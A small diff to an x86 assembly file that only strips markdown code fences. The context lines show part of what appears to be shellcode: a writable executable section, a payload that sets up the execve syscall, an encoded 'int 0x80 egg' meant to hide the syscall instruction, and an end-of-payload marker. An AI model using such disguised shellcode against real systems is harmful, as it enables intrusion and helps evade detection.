@@ -1,4 +1,3 @@
-```asm
 bits 32
 
 section .section exec write
@@ -44,4 +43,3 @@ payload:
 	mov 	al, 0xb		; SYS_execve
 	dw 	0x7dca		; int 0x80 egg
 	dd 	0xcafebabe	; end of payload
-```
